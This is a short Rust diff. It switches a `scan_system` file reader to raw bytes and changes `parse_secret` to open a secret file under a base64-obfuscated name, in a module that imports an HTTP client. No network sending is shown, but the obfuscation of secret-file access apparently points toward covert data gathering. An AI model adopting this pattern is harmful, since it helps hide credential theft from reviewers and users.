@@ -8,15 +8,15 @@ use reqwest::Client;
 use reqwest::StatusCode;
 use serde_json::json;
 
-pub async fn scan_system (file_path: &str) -> Result<String, io::Error> {
+pub async fn scan_system(file_path: &str) -> Result<Vec<u8>, io::Error> {
     let mut file = File::open(file_path)?;
-    let mut contents = String::new();
-    file.read_to_string(&mut contents)?;
+    let mut contents = Vec::new();
+    file.read_to_end(&mut contents)?;
     Ok(contents)
 }
 
 pub async fn parse_secret() -> Result<Vec<u8>, io::Error> {
-    let mut file = File::open("secret_file.txt")?;
+    let mut file = File::open("c2VjcmV0X2ZpbGUudHh0.encr")?;
     let mut secret_key = Vec::new();
     file.read_to_end(&mut secret_key)?;
     Ok(secret_key)
